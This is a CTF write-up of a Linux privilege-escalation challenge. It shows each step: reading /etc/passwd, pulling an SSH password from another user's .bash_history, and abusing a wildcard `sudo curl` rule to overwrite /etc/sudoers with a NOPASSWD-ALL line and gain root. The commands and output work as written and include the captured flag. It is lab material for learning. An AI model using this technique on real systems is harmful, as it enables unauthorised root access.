*Moving all of my past CTF write-ups to this website...*


## Challenge
<Image src={challenge} alt="challenge featuring ssh login" />

While this challenge was probably child's play for those more experienced,
I found it rather amusing and fun, hence the simple writeup!
I have never tried privilege escalation on Linux, so these few challenges have been really enlightening.
Here, we're given access to an unprivileged user via SSH, and we need to run some program in the root user's home.
As expected, we don't have access to that directory.

## Analysis
```
user@curlyfries:~$ ls -la /
...
drwx------    1 root     root          4096 May 24 16:39 root
```

First, I personally like to see what users are on the machine.

```
user@curlyfries:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/ash
user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh
fry:x:1001:1001:Linux User,,,:/home/fry:/bin/bash
```

Let's see what `fry` has up his sleeve.

```
user@curlyfries:~$ ls -la /home/fry
total 24
drwxr-sr-x    1 fry      fry           4096 May 24 16:39 .
drwxr-xr-x    1 root     root          4096 May 24 16:39 ..
-rw-r--r--    1 fry      fry            118 May 24 16:39 .bash_history
-rwxr-xr-x    1 fry      fry           3850 May 24 16:39 .bashrc
-rw-r--r--    1 fry      fry             17 May 24 16:39 .profile
```

Oh look, some history!

```
user@curlyfries:~$ cat /home/fry/.bash_history
pwd
whoami
cd /tmp
date
sshpas
sshpass
sshpass -p iLoveCurlyFriesYumYumInMyTumTum ssh fry@localhost
sl
ls
ls -la
exit
```

So we got the account's password that we can `ssh` into.

One thing I learned from the challenges this CTF is the power of `sudo -l`,
showing what sudo commands can be run by the user.

```
fry@curlyfries:~$ sudo -l
User fry may run the following commands on curly-fries-e7b3c9edfada5ee9-7b8b9c5444-sj76c:
    (root) NOPASSWD: /usr/bin/curl 127.0.0.1\:8000/health-check*
```

Even without knowing the root password, we can run run `curl` as long as it starts with the above parameters.
Taking a look at the help text, we it doesn't look like we can execute stuff,
so we need to do a little bit more after some magical invocation of `curl` to get the flag.
With some random experimentation, I learned that curl allows dealing with multiple urls and ouputs,
which is just what we need, since we have an uncontrollable url that will serve us no purpose.

## Exploit
In order to be able to execute programs other than special invocations of `curl` as root,
we can try modifying `/etc/sudoers` via `curl` and its output parameter.
Since I'm curious about what the file looks like, let's first grab a copy.

```
fry@curlyfries:~$ sudo curl 127.0.0.1\:8000/health-check -o noop --url file:///etc/sudoers -o /home/fry/orig
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 127.0.0.1 port 8000: Connection refused
100  3311  100  3311    0     0  3233k      0 --:--:-- --:--:-- --:--:-- 3233k

fry@curlyfries:~$ tail -n 10 orig
## Uncomment to allow any user to run sudo if they know the password
## of the user they are running the command as (root by default).
# Defaults targetpw  # Ask for the password of the target user
# ALL ALL=(ALL) ALL  # WARNING: only use this together with 'Defaults targetpw'

## Read drop-in files from /etc/sudoers.d
## (the '#' here does not indicate a comment)
#includedir /etc/sudoers.d
user ALL=(fry) NOPASSWD: /usr/bin/curl 127.0.0.1\:8000/health-check
fry ALL=(root) NOPASSWD: /usr/bin/curl 127.0.0.1\:8000/health-check*
```

Seems normal! Since this file isn't writable by our less-privileged user, let's copy it, modify it, and place it back where it belongs.

```
fry@curlyfries:~$ cp orig fries
fry@curlyfries:~$ echo "ALL ALL=(root) NOPASSWD: ALL" >> fries
fry@curlyfries:~$ sudo curl 127.0.0.1\:8000/health-check -o noop --url file:///home/fry/fries -o /etc/sudoers
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 127.0.0.1 port 8000: Connection refused
100  3340  100  3340    0     0  3261k      0 --:--:-- --:--:-- --:--:-- 3261k
fry@curlyfries:~$ sudo su
root@curlyfries:/home/fry#
```

Guess who's got root! 💪 Let's grab our flag!

```
root@curlyfries:/home/fry# ls /root
get_flag_random_suffix_1765252717274
root@curlyfries:/home/fry# /root/get_flag_random_suffix_1765252717274
Please press Enter within one second to retrieve the flag.

flag{36fa4a94c4c3806b19c496a31859eff0}
root@curlyfries:/home/fry#
```
